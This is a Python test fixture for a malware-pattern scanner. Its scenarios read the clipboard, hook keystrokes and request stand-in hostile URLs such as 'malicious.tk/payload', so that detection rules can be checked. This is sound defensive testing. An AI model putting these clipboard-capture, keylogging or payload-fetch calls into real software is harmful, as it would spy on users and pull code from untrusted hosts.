#!/usr/bin/env python3
"""
Test file to verify multiple patterns functionality
This file contains various clipboard access patterns that should be detected
by the new multiple patterns rule.
"""

import pyperclip
import pandas as pd
import tkinter as tk
from tkinter import clipboard
import win32clipboard


def scenario_pyperclip():
    # Should be detected by patterns: ["pyperclip.paste", "pyperclip.copy"]
    data = pyperclip.paste()
    pyperclip.copy("some data")
    return data


def scenario_pandas_clipboard():
    # Should be detected by pattern: "pandas.read_clipboard"
    df = pd.read_clipboard()

    # Should be detected by pattern: "*.to_clipboard"
    df.to_clipboard()
    return df


def scenario_tkinter_clipboard():
    # Should be detected by pattern: "tkinter.clipboard"
    root = tk.Tk()
    clipboard.get()
    clipboard.append("data")


def scenario_win32_clipboard():
    # Should be detected by pattern: "win32clipboard"
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()


def scenario_keyboard_hooks():
    # These should be detected by the keyboard patterns
    import keyboard

    keyboard.hook(lambda x: print(x))
    keyboard.on_press(lambda x: print(x))


def scenario_suspicious_domains():
    # These should be detected by suspicious domain patterns
    import requests

    requests.get("http://malicious.tk/payload")
    requests.get("http://phishing.ml/steal")
    requests.get("http://spam.ga/bot")
    requests.get("http://fake.cf/virus")


def scenario_url_shorteners():
    # These should be detected by URL shortener patterns
    import urllib.request

    urllib.request.urlopen("http://bit.ly/malicious")
    urllib.request.urlopen("http://t.co/phishing")
    urllib.request.urlopen("http://tinyurl.com/spam")


if __name__ == "__main__":
    scenario_pyperclip()
    scenario_pandas_clipboard()
    scenario_tkinter_clipboard()
    scenario_win32_clipboard()
    scenario_keyboard_hooks()
    scenario_suspicious_domains()
    scenario_url_shorteners()
